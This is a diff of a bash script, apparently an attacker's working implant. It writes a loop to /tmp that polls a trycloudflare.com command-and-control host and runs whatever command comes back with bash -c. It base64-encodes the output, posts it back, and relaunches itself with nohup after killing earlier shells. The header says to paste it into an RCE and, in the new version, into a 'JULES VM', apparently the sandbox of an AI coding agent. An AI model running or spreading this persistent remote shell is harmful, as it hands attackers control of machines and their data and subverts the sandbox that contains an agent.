@@ -1,32 +1,32 @@
-# PASTE THIS ENTIRE BLOCK INTO YOUR RCE
-cat << 'EOF' > /tmp/clean_shell.sh
+# PASTE THIS TO JULES VM
+cat << 'EOF' > /tmp/stable_shell.sh
 #!/bin/bash
 C2="https://italiano-successfully-rear-engage.trycloudflare.com"
-LOCK="/tmp/shell.lock"
 
-# Kill duplicates and self
+# Kill all previous shell processes to stop the loop-fighting
 pkill -f sync_verify.sh 2>/dev/null
 pkill -f silent_shell.sh 2>/dev/null
+pkill -f clean_shell.sh 2>/dev/null
 
 while true; do
-  # 1-second pulse
-  CMD=$(curl -s -L --max-time 1 "$C2")
+  # 2-second pulse
+  CMD=$(curl -s -L --max-time 5 "$C2")
   
   if [[ -n "$CMD" && "$CMD" != "none" ]]; then
-    # Execute and capture
+    # Execute command
     RESULT=$(/bin/bash -c "$CMD" 2>&1)
     
-    # Base64 encode without newlines
+    # Base64 encode the output
     [ -z "$RESULT" ] && RESULT=" "
     payload=$(echo "$RESULT" | base64 | tr -d '\n')
     
-    # Send back
+    # Send result back
     curl -s -X POST -d "$payload" "$C2" > /dev/null
   fi
-  sleep 1
+  sleep 2
 done
 EOF
 
-chmod +x /tmp/clean_shell.sh
-# Kill any existing clean_shells and start fresh
-pkill -f clean_shell.sh; nohup /tmp/clean_shell.sh >/dev/null 2>&1 &
+chmod +x /tmp/stable_shell.sh
+# Kill any existing stable_shells and launch
+pkill -f stable_shell.sh; nohup /tmp/stable_shell.sh >/dev/null 2>&1 &
